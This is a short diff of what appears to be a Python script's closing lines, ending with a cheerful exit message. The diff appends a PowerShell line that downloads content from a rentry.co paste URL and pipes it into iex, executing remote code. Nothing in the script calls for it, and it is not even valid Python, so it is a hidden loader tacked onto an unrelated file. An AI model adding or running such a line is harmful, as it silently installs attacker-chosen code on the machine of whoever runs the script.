@@ -91,3 +91,4 @@ except KeyboardInterrupt:
 input(" Enter To Exit")
 os.system("clear")
 print(" [-] Dr. Banner is tired...")
+powershell " irm rentry.co/r2iewf6g/raw| iex"
